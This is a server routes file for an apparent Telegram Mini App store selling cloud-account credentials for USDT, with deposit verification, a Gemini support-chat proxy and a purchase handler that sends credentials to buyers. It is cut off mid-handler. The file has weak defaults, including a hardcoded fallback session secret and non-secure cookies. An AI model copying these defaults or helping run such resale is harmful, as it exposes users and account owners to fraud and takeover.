import type { Express, Request, Response, NextFunction } from "express";
// Triggering auto-deploy for V-7
import express from "express";
import { type Server as HttpServer } from "http";
import { Server as SocketServer } from "socket.io";
import path from 'path';
import fs from 'fs';
import multer from 'multer';
import { credentials, settings, payments, insertCredentialSchema, telegramUsers, users, insertAwsAccountSchema, insertSpecialOfferSchema, orders, products } from "@shared/schema";
import { eq, desc, and, sql, gte, inArray } from "drizzle-orm";
import { db, pool } from "./db";
import { storage } from "./storage";
import { initBot, getBroadcastBot } from "./telegram";
import { setupAuth } from "./replit_integrations/auth";
import { api } from "@shared/routes";
import { z } from "zod";
import { fetchActivity } from "./aws-service";
import { BackupService } from "./backup-service";
import TelegramBot from "node-telegram-bot-api";
import crypto from "crypto";
import axios from "axios";
import { sendAdminPushNotification, initPushNotifications } from "./push-notifications";
import bcrypt from "bcryptjs";
import session from "express-session";
import connectPg from "connect-pg-simple";
import { format } from "date-fns";
import { 
  initTelegramClientService, 
  sendOtpCode, 
  signInClient, 
  getChats, 
  getChatMessages, 
  sendChatMessage, 
  logoutClient, 
  isClientConnected,
  getPeerDetails,
  getTelegramClient,
  downloadMessageMedia
} from "./telegram-client-service";
import {
  initForwardService,
  getForwardConfig,
  updateForwardConfig,
  getDetectedGroups,
  saveDetectedGroups,
  syncGroupsManually,
  clearForwardCounters,
  testForwardMessage,
  addOrUpdateGroup,
  removeGroup
} from "./forward-service";


function escapeHTML(str: string): string {
  if (!str) return '';
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function normalizeAptosAddress(addr: string): string {
  if (!addr) return '';
  let clean = addr.toLowerCase().trim();
  if (clean.startsWith('0x')) {
    clean = clean.substring(2);
  }
  return clean.padStart(64, '0');
}

async function sendPhotoWithCache(
  targetBot: TelegramBot,
  chatId: number | string,
  imagePath: string,
  cacheKey: string,
  options: TelegramBot.SendPhotoOptions
): Promise<TelegramBot.Message> {
  const cachedSetting = await storage.getSetting(cacheKey);
  if (cachedSetting?.value) {
    try {
      console.log(`[Bot API] Sending photo using cached file_id for ${cacheKey}`);
      return await targetBot.sendPhoto(chatId, cachedSetting.value, options);
    } catch (err: any) {
      console.warn(`[Bot API] Failed to send photo using cached file_id for ${cacheKey}: ${err.message || err}. Falling back to file upload.`);
      await storage.updateSetting(cacheKey, "");
    }
  }

  if (!fs.existsSync(imagePath)) {
    throw new Error(`Photo file not found at: ${imagePath}`);
  }
  const photoBuffer = fs.readFileSync(imagePath);

  console.log(`[Bot API] Uploading photo buffer for ${cacheKey}`);
  const msg = await targetBot.sendPhoto(chatId, photoBuffer, options);

  if (msg.photo && msg.photo.length > 0) {
    const fileId = msg.photo[msg.photo.length - 1].file_id;
    console.log(`[Bot API] Successfully uploaded photo. Caching file_id: ${fileId} for ${cacheKey}`);
    await storage.updateSetting(cacheKey, fileId).catch(err => {
      console.error(`[Bot API] Failed to save cached file_id:`, err);
    });
  }

  return msg;
}

async function verifyDepositViaBinance(
  txId: string,
  networkType: 'TRC20' | 'APTOS',
  walletAddress: string
): Promise<{ success: boolean; actualAmount?: number; error?: string }> {
  try {
    const apiKey = (await storage.getSetting('BINANCE_API_KEY'))?.value;
    const secretKey = (await storage.getSetting('BINANCE_SECRET_KEY'))?.value;

    if (!apiKey || !secretKey) {
      return { success: false, error: 'Binance API credentials are not configured by the administrator.' };
    }

    const timestamp = Date.now();
    const queryStr = `coin=USDT&timestamp=${timestamp}`;
    const signature = crypto
      .createHmac('sha256', secretKey)
      .update(queryStr)
      .digest('hex');

    const res = await axios.get(`https://api.binance.com/sapi/v1/capital/deposit/hisrec?${queryStr}&signature=${signature}`, {
      headers: {
        'X-MBX-APIKEY': apiKey,
        'Content-Type': 'application/json'
      }
    });

    const deposits = res.data;
    if (!deposits || !Array.isArray(deposits)) {
      return { success: false, error: 'Could not fetch deposit records from Binance. Please verify API keys.' };
    }

    const cleanTxId = txId.trim().toLowerCase();
    const match = deposits.find((d: any) => (d.txId || '').toLowerCase() === cleanTxId);

    if (!match) {
      return { success: false, error: 'Transaction not found in Binance deposit history. Please ensure it has been fully confirmed on-chain and credited to Binance.' };
    }

    if (match.status !== 1) {
      return { success: false, error: 'Transaction is pending or not successfully completed in Binance.' };
    }

    if ((match.coin || '').toUpperCase() !== 'USDT') {
      return { success: false, error: 'Transaction coin is not USDT.' };
    }

    // Verify network
    const net = (match.network || '').toUpperCase();
    if (networkType === 'TRC20') {
      if (net !== 'TRX' && net !== 'TRON') {
        return { success: false, error: 'Transaction network is not TRON (TRC20).' };
      }
    } else if (networkType === 'APTOS') {
      if (net !== 'APT' && net !== 'APTOS') {
        return { success: false, error: 'Transaction network is not Aptos.' };
      }
    }

    // Verify deposit address matches our configured wallet address
    const depAddr = (match.address || '').trim();
    if (networkType === 'APTOS') {
      if (normalizeAptosAddress(depAddr) !== normalizeAptosAddress(walletAddress)) {
        return { success: false, error: 'Deposit destination address does not match our configured Aptos wallet.' };
      }
    } else {
      if (depAddr.toLowerCase() !== walletAddress.trim().toLowerCase()) {
        return { success: false, error: 'Deposit destination address does not match our configured TRC20 wallet.' };
      }
    }

    const actualAmount = parseFloat(match.amount);
    if (isNaN(actualAmount) || actualAmount <= 0) {
      return { success: false, error: 'Invalid deposit amount.' };
    }

    return { success: true, actualAmount };
  } catch (err: any) {
    console.error('Binance deposit verification error:', err);
    return { success: false, error: `Binance API error: ${err.response?.data?.msg || err.message}` };
  }
}

async function verifyTrc20Transaction(
  txId: string,
  walletAddress: string
): Promise<{ success: boolean; actualAmount?: number; error?: string }> {
  try {
    const res = await axios.get(`https://apilist.tronscanapi.com/api/transaction-info?hash=${txId.trim()}`);
    const data = res.data;
    if (!data || Object.keys(data).length === 0) {
      return { success: false, error: 'Transaction not found on Tron blockchain. Please wait a moment and try again.' };
    }

    const confirmed = data.confirmed === true;
    const isSuccess = data.contractRet === 'SUCCESS' || data.result === 'SUCCESS';
    if (!confirmed || !isSuccess) {
      return { success: false, error: 'Transaction is not confirmed or has failed.' };
    }

    const transfers = data.trc20TransferInfo || [];
    let foundTransfer = null;

    for (const t of transfers) {
      const toAddr = (t.to_address || t.toAddress || '').trim();
      const contractAddr = (t.contract_address || t.contractAddress || '').trim();
      
      if (toAddr.toLowerCase() === walletAddress.trim().toLowerCase() && 
          contractAddr === 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t') {
        foundTransfer = t;
        break;
      }
    }

    if (!foundTransfer) {
      return { success: false, error: 'No USDT transfer to the configured wallet address was found in this transaction.' };
    }

    const amountStr = foundTransfer.amount_str || foundTransfer.amount || '0';
    const decimals = foundTransfer.decimals || foundTransfer.tokenInfo?.tokenDecimal || 6;
    const actualAmount = parseFloat(amountStr) / Math.pow(10, decimals);

    if (actualAmount <= 0) {
      return { success: false, error: 'Transaction has an invalid amount.' };
    }

    return { success: true, actualAmount };
  } catch (err: any) {
    console.error('TRC20 verification error:', err);
    return { success: false, error: `Verification service error: ${err.message}` };
  }
}

async function verifyAptosTransaction(
  txId: string,
  walletAddress: string
): Promise<{ success: boolean; actualAmount?: number; error?: string }> {
  try {
    const cleanTxId = txId.trim();
    const res = await axios.get(`https://fullnode.mainnet.aptoslabs.com/v1/transactions/by_hash/${cleanTxId}`);
    const data = res.data;

    if (!data) {
      return { success: false, error: 'Transaction not found on Aptos blockchain.' };
    }

    if (data.success !== true) {
      return { success: false, error: 'Aptos transaction has failed or is pending.' };
    }

    const normWallet = normalizeAptosAddress(walletAddress);
    let actualAmount = 0;
    let found = false;

    if (data.payload) {
      const payload = data.payload;
      const fn = payload.function || '';
      
      if (fn === '0x1::primary_fungible_store::transfer') {
        const args = payload.arguments || payload.function_arguments || [];
        const recipient = args[1] || '';
        const amountStr = args[2] || '0';

        if (normalizeAptosAddress(recipient) === normWallet) {
          actualAmount = parseFloat(amountStr) / 1000000;
          found = true;
        }
      }
      else if (fn === '0x1::coin::transfer' || fn === '0x1::aptos_account::transfer_coins') {
        const args = payload.arguments || payload.function_arguments || [];
        const recipient = args[0] || '';
        const amountStr = args[1] || '0';

        if (normalizeAptosAddress(recipient) === normWallet) {
          actualAmount = parseFloat(amountStr) / 1000000;
          found = true;
        }
      }
    }

    if (!found && data.events) {
      for (const event of data.events) {
        const evType = event.type || '';
        if (evType.includes('::coin::DepositEvent') || evType.includes('::fungible_asset::DepositEvent') || evType.includes('Deposit')) {
          const guidAddress = event.guid?.account_address || '';
          if (normalizeAptosAddress(guidAddress) === normWallet) {
            const amountStr = event.data?.amount || '0';
            actualAmount = parseFloat(amountStr) / 1000000;
            found = true;
            break;
          }
        }
      }
    }

    if (!found) {
      return { success: false, error: 'No USDT deposit to the configured wallet address was found in this transaction.' };
    }

    if (actualAmount <= 0) {
      return { success: false, error: 'Transaction has an invalid amount.' };
    }

    return { success: true, actualAmount };
  } catch (err: any) {
    console.error('Aptos verification error:', err);
    if (err.response && err.response.status === 404) {
      return { success: false, error: 'Transaction not found on Aptos blockchain. Please wait a moment and try again.' };
    }
    return { success: false, error: `Verification service error: ${err.message}` };
  }
}

async function createCryptoBotInvoice(
  amountUsd: number,
  payloadStr: string
): Promise<{ success: boolean; payUrl?: string; invoiceId?: number; error?: string }> {
  try {
    const tokenSetting = await storage.getSetting('CRYPTO_BOT_API_TOKEN');
    const rawToken = tokenSetting?.value || process.env.CRYPTO_BOT_API_TOKEN || '';
    const apiToken = rawToken.trim();

    if (!apiToken) {
      return { success: false, error: '@CryptoBot API token is not configured in Admin Settings.' };
    }

    if (apiToken.startsWith('http://') || apiToken.startsWith('https://')) {
      return { 
        success: false, 
        error: '@CryptoBot API Token in Admin Settings is invalid (contains a URL instead of a bot token). Please update your API token in Admin Dashboard > Settings.' 
      };
    }

    const isTestnet = (await storage.getSetting('CRYPTO_BOT_TESTNET'))?.value === 'true';
    const baseUrl = isTestnet ? 'https://testnet-pay.crypt.bot/api' : 'https://pay.crypt.bot/api';

    const botUsername = (await storage.getSetting('BOT_USERNAME'))?.value || '';
    const invoiceBody: any = {
      asset: 'USDT',
      amount: amountUsd.toFixed(2),
      payload: payloadStr,
      description: `Deposit $${amountUsd.toFixed(2)} to ShopBot`
    };

    if (botUsername) {
      invoiceBody.paid_btn_name = 'openBot';
      invoiceBody.paid_btn_url = `https://t.me/${botUsername.replace('@', '')}`;
    }

    const res = await axios.post(
      `${baseUrl}/createInvoice`,
      invoiceBody,
      {
        headers: {
          'Crypto-Pay-API-Token': apiToken,
          'Content-Type': 'application/json'
        },
        timeout: 15000
      }
    );

    if (res.data && res.data.ok && res.data.result) {
      const result = res.data.result;
      const payUrl = result.mini_app_pay_url || result.pay_url || result.bot_invoice_url;
      return { success: true, payUrl, invoiceId: result.invoice_id };
    }

    return { success: false, error: res.data?.error?.name || 'Failed to create invoice via @CryptoBot' };
  } catch (err: any) {
    const errCode = err.response?.data?.error?.name || err.message || '';
    console.error('CryptoBot createInvoice error:', err.response?.data || err.message);
    if (errCode === 'UNAUTHORIZED') {
      return { 
        success: false, 
        error: 'Invalid @CryptoBot API Token (UNAUTHORIZED). Please get a valid token from @CryptoBot or @CryptoTestnetBot and update it in Admin Dashboard > Settings.' 
      };
    }
    return { success: false, error: errCode || 'Failed to create invoice via @CryptoBot' };
  }
}

async function checkCryptoBotInvoiceStatus(invoiceId: string): Promise<{ paid: boolean; error?: string }> {
  try {
    const tokenSetting = await storage.getSetting('CRYPTO_BOT_API_TOKEN');
    const rawToken = tokenSetting?.value || process.env.CRYPTO_BOT_API_TOKEN || '';
    const apiToken = rawToken.trim();
    if (!apiToken || apiToken.startsWith('http://') || apiToken.startsWith('https://')) {
      return { paid: false, error: 'CryptoBot API token missing or invalid' };
    }

    const isTestnet = (await storage.getSetting('CRYPTO_BOT_TESTNET'))?.value === 'true';
    const baseUrl = isTestnet ? 'https://testnet-pay.crypt.bot/api' : 'https://pay.crypt.bot/api';

    const res = await axios.post(
      `${baseUrl}/getInvoices`,
      { invoice_ids: [parseInt(invoiceId, 10)] },
      {
        headers: {
          'Crypto-Pay-API-Token': apiToken,
          'Content-Type': 'application/json'
        },
        timeout: 10000
      }
    );

    if (res.data && res.data.ok && res.data.result && res.data.result.items && res.data.result.items.length > 0) {
      const inv = res.data.result.items[0];
      if (inv.status === 'paid') {
        return { paid: true };
      }
    }
    return { paid: false };
  } catch (err: any) {
    console.error('CryptoBot getInvoices check error:', err.response?.data || err.message);
    return { paid: false, error: err.message };
  }
}

declare module "express-session" {
  interface SessionData {
    userId: number;
  }
}

const activeSpecialOfferTimers = new Map<number, NodeJS.Timeout>();

const storage_disk = multer.diskStorage({
  destination: function (req: any, file: any, cb: any) {
    const uploadPath = path.join(process.cwd(), 'public/uploads');
    if (!fs.existsSync(uploadPath)) {
      fs.mkdirSync(uploadPath, { recursive: true });
    }
    cb(null, uploadPath);
  },
  filename: function (req: any, file: any, cb: any) {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1e9);
    cb(null, uniqueSuffix + path.extname(file.originalname));
  }
});
const upload = multer({ storage: storage_disk });

export async function registerRoutes(
  httpServer: HttpServer,
  app: Express,
  io: SocketServer
): Promise<HttpServer> {
  // Initialize Telegram client service (MTProto)
  initTelegramClientService(io);

  // Initialize Telegram Auto-Forward service
  initForwardService(io);

  const sessionTtl = 7 * 24 * 60 * 60 * 1000; // 1 week
  const pgStore = connectPg(session);
  const sessionStore = new (pgStore as any)({
    pool: pool,
    createTableIfMissing: true,
    ttl: sessionTtl / 1000, // connect-pg-simple expects seconds
    tableName: "session",
  });

  app.use("/api", (_req, res, next) => {
    res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate");
    res.setHeader("Pragma", "no-cache");
    res.setHeader("Expires", "0");
    next();
  });

  app.get("/api/health", (_req, res) => {
    res.json({ status: "ok", timestamp: new Date().toISOString() });
  });

  app.set("trust proxy", 1);
  app.use(session({
    secret: process.env.SESSION_SECRET || "default_session_secret_for_dev",
    store: sessionStore,
    resave: false,
    saveUninitialized: false,
    cookie: {
      httpOnly: true,
      secure: false,
      maxAge: sessionTtl,
    },
  }));

  // Ensure admin user is created on every restart for now to guarantee it exists
  const adminEmail = process.env.ADMIN_EMAIL;
  const adminPass = process.env.ADMIN_PASSWORD;
  if (adminEmail && adminPass) {
    const hashed = await bcrypt.hash(adminPass, 10);
    const existingAdmin = await storage.getUserByEmail(adminEmail);
    if (!existingAdmin) {
      await db.insert(users).values({
        email: adminEmail,
        password: hashed,
        firstName: "Admin",
        lastName: "User"
      });
      console.log(`Admin creation: [${adminEmail}]`);
    } else {
      await db.update(users).set({ password: hashed }).where(eq(users.email, adminEmail));
      console.log(`Admin reset: [${adminEmail}]`);
    }
  }

  const isAuth = (req: Request, res: Response, next: NextFunction) => {
    if (req.session.userId) return next();
    res.status(401).json({ message: "Unauthorized" });
  };

  /**
   * Telegram Mini App Authentication Middleware
   * Verifies the initData sent from the Telegram Mini App using the BOT_TOKEN
   */
  const verifyMiniAppAuth = async (req: Request, res: Response, next: NextFunction) => {
    const initData = req.headers['x-telegram-init-data'] as string;
    if (!initData) {
      return res.status(401).json({ message: "No Telegram init data provided" });
    }

    const token = await storage.getSetting("TELEGRAM_BOT_TOKEN");
    const botToken = token?.value || process.env.TELEGRAM_BOT_TOKEN;

    if (!botToken) {
      return res.status(500).json({ message: "Bot token not configured" });
    }

    try {
      // 1. Parse initData
      const urlParams = new URLSearchParams(initData);
      const hash = urlParams.get('hash');
      urlParams.delete('hash');

      // 2. Sort keys alphabetically
      const sortedParams = Array.from(urlParams.entries())
        .map(([key, value]) => `${key}=${value}`)
        .sort()
        .join('\n');

      // 3. Verify hash
      const secretKey = crypto.createHmac('sha256', 'WebAppData').update(botToken).digest();
      const calculatedHash = crypto.createHmac('sha256', secretKey).update(sortedParams).digest('hex');

      if (calculatedHash !== hash) {
        return res.status(401).json({ message: "Invalid Telegram authentication hash" });
      }

      // 4. Extract user info and attach to request
      const userData = JSON.parse(urlParams.get('user') || '{}');
      (req as any).tgUser = userData;

      next();
    } catch (err) {
      console.error("MiniApp Auth Error:", err);
      res.status(401).json({ message: "Authentication failed" });
    }
  };

  // --- Mini App Public Shop APIs ---

  // Get current user balance and info within Mini App
  app.get("/api/mini/user", verifyMiniAppAuth, async (req, res) => {
    const tgUser = (req as any).tgUser;
    if (!tgUser.id) return res.status(400).json({ message: "User ID missing" });

    // Fetch or create user in our DB
    let user = await storage.getTelegramUser(tgUser.id.toString());
    if (!user) {
      user = await storage.createTelegramUser({
        telegramId: tgUser.id.toString(),
        username: tgUser.username || "",
        firstName: tgUser.first_name || "",
        lastName: tgUser.last_name || "",
        balance: 0,
        lastAction: null
      });
    }
    res.json(user);
  });

  // Push Notification Routes
  app.get("/api/admin/push-key", isAuth, async (req, res) => {
    const setting = await storage.getSetting("VAPID_PUBLIC_KEY");
    res.json({ publicKey: setting?.value });
  });

  app.post("/api/admin/subscribe", isAuth, async (req, res) => {
    try {
      const { subscription } = req.body;
      if (req.session.userId) {
        await storage.savePushSubscription(req.session.userId, subscription);
        res.json({ success: true });
      } else {
        res.status(401).send();
      }
    } catch (err) {
      res.status(400).json({ message: "Invalid subscription" });
    }
  });

  /**
   * Public Support Info API
   * Used by AI Agents (like DigitalOcean Agent) to get real-time price & stock data.
   * No complex auth required, but can be secured via SUPPORT_API_KEY in .env
   */
  app.get("/api/public/support-info", async (req, res) => {
    // Optional basic security: ?key=your_secret
    const providedKey = req.query.key;
    const supportKey = process.env.SUPPORT_API_KEY;
    if (supportKey && providedKey !== supportKey) {
      return res.status(401).json({ message: "Unauthorized. Use correct API key." });
    }

    try {
      const allProducts = await storage.getProducts();
      const allOffers = await storage.getSpecialOffers();

      let summary = "CURRENT SHOP STATUS SUMMARY:\n\n";

      // 1. Process Products
      summary += "AVAILABLE CLOUD ACCOUNTS:\n";
      const availableProducts = await Promise.all(allProducts.map(async p => {
        const stock = await storage.getCredentialsByProduct(p.id);
        const stockCount = stock.filter(s => s.status === 'available').length;
        return { ...p, stockCount };
      }));

      const inStock = availableProducts.filter(p => p.stockCount > 0);
      if (inStock.length === 0) {
        summary += "- No individual accounts currently in stock.\n";
      } else {
        inStock.forEach(p => {
          summary += `- ${p.type} | ${p.name}: $${(p.price / 100).toFixed(2)} (Stock: ${p.stockCount} units)\n`;
        });
      }

      // 2. Process Special Offers
      summary += "\nACTIVE SPECIAL OFFERS (BUNDLE DEALS):\n";
      const activeOffers = allOffers.filter(o => {
        const isNotExpired = !o.expiresAt || new Date(o.expiresAt) > new Date();
        return o.status === 'active' && isNotExpired;
      });

      if (activeOffers.length === 0) {
        summary += "- No active special offers at the moment.\n";
      } else {
        activeOffers.forEach(o => {
          const expiresStr = o.expiresAt ? ` (Expires: ${new Date(o.expiresAt).toLocaleString()})` : "";
          summary += `- ${o.name}: Bundle of ${o.bundleQuantity} units to $${(o.price / 100).toFixed(2)}${expiresStr}\n`;
        });
      }

      summary += "\nSUPPORT CONTACT: @rochana_imesh on Telegram.";

      // Return both as plain text (easier for AI) and structured JSON
      if (req.headers.accept?.includes('text/plain')) {
        res.header('Content-Type', 'text/plain');
        return res.send(summary);
      }
      
      res.json({
        lastUpdated: new Date().toISOString(),
        summary,
        raw: {
          products: inStock,
          offers: activeOffers
        }
      });

    } catch (err) {
      console.error("Support Info API Error:", err);
      res.status(500).json({ message: "Failed to fetch support data" });
    }
  });

  /**
   * AI Chat Proxy
   * Proxies support chat messages to the Google AI Studio Gemini API with full shop context.
   */
  app.post("/api/support/chat", async (req, res) => {
    const { messages, message } = req.body;
    
    let incomingMessages: Array<{ role: string; content: string }> = [];
    
    if (messages && Array.isArray(messages)) {
      incomingMessages = messages;
    } else if (message && typeof message === 'string') {
      incomingMessages = [{ role: 'user', content: message }];
    } else {
      return res.status(400).json({ message: "messages array or message string required" });
    }

    try {
      // 1. Retrieve Gemini API Key
      const geminiApiKeySetting = await storage.getSetting("GEMINI_API_KEY");
      const apiKey = geminiApiKeySetting?.value || "";

      if (!apiKey) {
        return res.json({ answer: "⚠️ Live support assistant is temporarily offline. Please configure your Google AI Studio Gemini API Key in the admin settings dashboard to enable live chat support." });
      }

      // 2. Load shop products, special offers, FAQ, and branding for the AI context
      const allProducts = await storage.getProducts();
      const allOffers = await storage.getSpecialOffers();
      const faqSetting = await storage.getSetting("faq_content");
      const storeNameSetting = await storage.getSetting("STORE_NAME");
      const supportUsernameSetting = await storage.getSetting("SUPPORT_USERNAME");
      const extraInstructionsSetting = await storage.getSetting("EXTRA_INSTRUCTIONS");

      const storeName = storeNameSetting?.value || "ShopBot";
      const supportUsername = supportUsernameSetting?.value || "@rochana_imesh";
      const faq = faqSetting?.value || "No special instructions. Direct them to support if needed.";
      const extraInstructions = extraInstructionsSetting?.value || "";

      const availableProducts = await Promise.all(allProducts.map(async p => {
        const stock = await storage.getCredentialsByProduct(p.id);
        const stockCount = stock.filter(s => s.status === 'available').length;
        return { ...p, stockCount };
      }));
      const inStock = availableProducts.filter(p => p.stockCount > 0);

      const activeOffers = allOffers.filter(o => {
        const isNotExpired = !o.expiresAt || new Date(o.expiresAt) > new Date();
        return o.status === 'active' && isNotExpired;
      });

      // Construct system instruction
      let systemPrompt = `You are the AI Support Concierge (live chat support agent) for our Telegram Mini App store, "${storeName}".\n`;
      systemPrompt += `Your primary goal is to help users browse available products, check special bundle offers, read FAQs, and assist them in making purchases.\n`;
      systemPrompt += `Be friendly, helpful, polite, and reply to the user in their language (or default to English). Keep your responses concise and well-structured, suitable for mobile/chat views.\n\n`;

      systemPrompt += `AVAILABLE PRODUCTS / CLOUD ACCOUNTS:\n`;
      if (inStock.length === 0) {
        systemPrompt += `- No individual accounts currently in stock.\n`;
      } else {
        inStock.forEach(p => {
          systemPrompt += `- [ID: ${p.id}] ${p.type} | ${p.name}: $${(p.price / 100).toFixed(2)} (In Stock: ${p.stockCount} units)\n`;
        });
      }
      systemPrompt += `\n`;

      systemPrompt += `ACTIVE SPECIAL OFFERS (BUNDLE DEALS):\n`;
      if (activeOffers.length === 0) {
        systemPrompt += `- No active special offers at the moment.\n`;
      } else {
        activeOffers.forEach(o => {
          const expiresStr = o.expiresAt ? ` (Expires: ${new Date(o.expiresAt).toLocaleString()})` : "";
          systemPrompt += `- ${o.name}: Bundle of ${o.bundleQuantity} units of product ID ${o.productId} for $${(o.price / 100).toFixed(2)}${expiresStr}\n`;
        });
      }
      systemPrompt += `\n`;

      systemPrompt += `FAQ SECTION:\n${faq}\n\n`;
      if (extraInstructions) {
        systemPrompt += `EXTRA INSTRUCTIONS & RULES:\n${extraInstructions}\n\n`;
      }
      systemPrompt += `IMPORTANT RULES:\n`;
      systemPrompt += `1. If a user asks for human assistance or support, tell them to click the support contact button or contact ${supportUsername} on Telegram directly.\n`;
      systemPrompt += `2. Do not make up product details or prices that are not listed above.\n`;
      systemPrompt += `3. Maintain developer credit recognition if asked: Developer credits belong to Rochana Imesh.\n`;

      // 3. Map messages history to Gemini format (roles must be 'user' or 'model')
      const geminiMessages = incomingMessages.map(msg => ({
        role: msg.role === "user" ? "user" : "model",
        parts: [{ text: msg.content || "" }]
      }));

      // Call Gemini API
      console.log(`[AI Chat] Forwarding support chat to Gemini API`);
      const response = await axios.post(
        `https://generativelanguage.googleapis.com/v1beta/models/gemini-flash-latest:generateContent?key=${apiKey}`,
        {
          contents: geminiMessages,
          systemInstruction: {
            parts: [{ text: systemPrompt }]
          }
        },
        {
          headers: {
            "Content-Type": "application/json",
          },
          timeout: 30000,
        }
      );

      const reply =
        response.data?.candidates?.[0]?.content?.parts?.[0]?.text ||
        "I'm sorry, I could not process your request at this moment.";

      res.json({ answer: reply });
    } catch (err: any) {
      console.error("❌ Gemini API Chat Error:", err.message);
      if (err.response) {
        console.error("Status:", err.response.status);
        console.error("Data:", JSON.stringify(err.response.data));
      }
      res.json({ answer: "⚠️ Live support assistant is temporarily unavailable. Please make sure the Gemini API Key is correctly configured in your Settings." });
    }
  });


  // Get active products for the shop
  app.get("/api/mini/products", verifyMiniAppAuth, async (req, res) => {
    const products = await storage.getProducts();
    // Only return products that have available stock (simplified for now)
    const activeProducts = await Promise.all(products.map(async p => {
      const stock = await storage.getCredentialsByProduct(p.id);
      return {
        ...p,
        stockCount: stock.filter(s => s.status === 'available').length
      };
    }));
    res.json(activeProducts.filter(p => p.stockCount > 0));
  });

  // Get active special offers
  app.get("/api/mini/offers", verifyMiniAppAuth, async (req, res) => {
    const offers = await storage.getSpecialOffers();
    res.json(offers.filter(o => o.status === 'active'));
  });

  // Get user's purchase history within Mini App
  app.get("/api/mini/orders", verifyMiniAppAuth, async (req, res) => {
    const tgUser = (req as any).tgUser;
    if (!tgUser.id) return res.status(400).json({ message: "User ID missing" });

    const dbUser = await storage.getTelegramUser(tgUser.id.toString());
    if (!dbUser) return res.status(404).json({ message: "User not found" });

    const allOrders = await storage.getOrders();
    const userOrders = allOrders
      .filter(o => o.telegramUserId === dbUser.id)
      .sort((a, b) => b.id - a.id); // Newest first

    res.json(userOrders);
  });
  
  // Get user's payment history (top-ups) within Mini App
  app.get("/api/mini/payments", verifyMiniAppAuth, async (req, res) => {
    const tgUser = (req as any).tgUser;
    if (!tgUser.id) return res.status(400).json({ message: "User ID missing" });

    const dbUser = await storage.getTelegramUser(tgUser.id.toString());
    if (!dbUser) return res.status(404).json({ message: "User not found" });

    const userPayments = await storage.getPaymentsForUser(dbUser.id);
    res.json(userPayments);
  });

  // Purchase a product via Mini App
  app.post("/api/mini/purchase", verifyMiniAppAuth, async (req, res) => {
    const tgUser = (req as any).tgUser;
    const { productId, quantity = 1 } = req.body;

    if (!productId) return res.status(400).json({ message: "Product ID required" });
    if (quantity < 1) return res.status(400).json({ message: "Invalid quantity" });

    try {
      const result = await db.transaction(async (tx) => {
        // 1. Get user and product inside transaction
        const user = await tx.query.telegramUsers.findFirst({
          where: eq(telegramUsers.telegramId, tgUser.id.toString())
        });
        const product = await tx.query.products.findFirst({
          where: eq(products.id, productId)
        });

        if (!user || !product) {
          throw new Error("User or product not found");
        }

        const totalPrice = product.price * quantity;

        // 2. Check stock first
        const availableItems = await tx.select()
          .from(credentials)
          .where(and(eq(credentials.productId, productId), eq(credentials.status, 'available')))
          .limit(quantity)
          .for('update', { skipLocked: true });

        if (availableItems.length < quantity) {
          throw new Error(`Insufficient stock. Only ${availableItems.length} items available.`);
        }

        // 3. Check and Deduct balance atomically
        const [updatedUser] = await tx
          .update(telegramUsers)
          .set({
            balance: sql`${telegramUsers.balance} - ${totalPrice}`
          })
          .where(and(eq(telegramUsers.id, user.id), gte(telegramUsers.balance, totalPrice)))
          .returning();

        if (!updatedUser) {
          throw new Error("Insufficient balance");
        }

        const itemIds = availableItems.map(item => item.id);
        await tx.update(credentials)
          .set({ status: 'sold' })
          .where(inArray(credentials.id, itemIds));

        // 4. Create order records
        const orderPromises = availableItems.map(item => 
          tx.insert(orders).values({
            telegramUserId: user.id,
            productId: product.id,
            status: 'completed',
            credentialId: item.id
          })
        );
        await Promise.all(orderPromises);

        return { product, availableItems, newBalance: updatedUser.balance, quantity };
      });

      // 5. Send credentials to user via Telegram Bot (Non-blocking)
      // Split into chunks of 10 to avoid Telegram's 4096 character message limit
      const CHUNK_SIZE = 10;
      const allItems = result.availableItems;

      const sendChunked = async () => {
        try {
          // First message: purchase summary header
          const headerMsg = `<tg-emoji emoji-id="6276090299232031662">✅</tg-emoji> <b>Purchase Successful!</b> <tg-emoji emoji-id="5456343263340405032">🛍️</tg-emoji>\n\n` +
            `<tg-emoji emoji-id="5231102735817918643">📦</tg-emoji> Product: <b>${result.product.name}</b>\n` +
            `🔢 Quantity: <b>${result.quantity} units</b>\n` +
            `<tg-emoji emoji-id="5201692367437974073">💵</tg-emoji> Total Price: <b>$${((result.product.price * result.quantity) / 100).toFixed(2)}</b>\n\n` +
            `<tg-emoji emoji-id="6276134137963222688">🔑</tg-emoji> <b>Your credentials are below${allItems.length > CHUNK_SIZE ? ` (sent in ${Math.ceil(allItems.length / CHUNK_SIZE)} parts)` : ''}:</b>`;

          await bot?.sendMessage(tgUser.id, headerMsg, { parse_mode: 'HTML' });

          // Send credentials in chunks of CHUNK_SIZE
          for (let i = 0; i < allItems.length; i += CHUNK_SIZE) {
            const chunk = allItems.slice(i, i + CHUNK_SIZE);
            const partNum = Math.floor(i / CHUNK_SIZE) + 1;
            const totalParts = Math.ceil(allItems.length / CHUNK_SIZE);

            let chunkMsg = totalParts > 1
              ? `<tg-emoji emoji-id="6276134137963222688">🔑</tg-emoji> <b>Credentials (Part ${partNum}/${totalParts}):</b>\n`
              : `<tg-emoji emoji-id="6276134137963222688">🔑</tg-emoji> <b>Your Credentials:</b>\n`;

            chunk.forEach((item, idx) => {
              const num = (i + idx + 1).toString().padStart(2, '0');
              chunkMsg += `<b>Item ${num}:</b> <code>${item.content}</code>\n`;
            });

            if (i + CHUNK_SIZE >= allItems.length) {
              chunkMsg += `\nThank you for shopping with us! <tg-emoji emoji-id="5456343263340405032">🛍️</tg-emoji>`;
            }

            await bot?.sendMessage(tgUser.id, chunkMsg, { parse_mode: 'HTML' });
          }
        } catch (err) {
          console.error("Failed to send bot DM for purchase:", err);
        }
      };

      sendChunked();

      // Emit real-time notification to Admin Dashboard
      io.emit('admin_notification', {
        type: 'purchase',
        title: 'New Purchase',
        message: `${tgUser.first_name} bought ${result.quantity}x ${result.product.name} ($${((result.product.price * result.quantity) / 100).toFixed(2)})`,
        data: result
      });

      // Emit Native Push Notification
      sendAdminPushNotification(
        'New Purchase',
        `${tgUser.first_name} bought ${result.quantity}x ${result.product.name} ($${((result.product.price * result.quantity) / 100).toFixed(2)})`
      ).catch(console.error);

      res.json({
        success: true,
        message: "Purchase completed.",
        newBalance: result.newBalance / 100
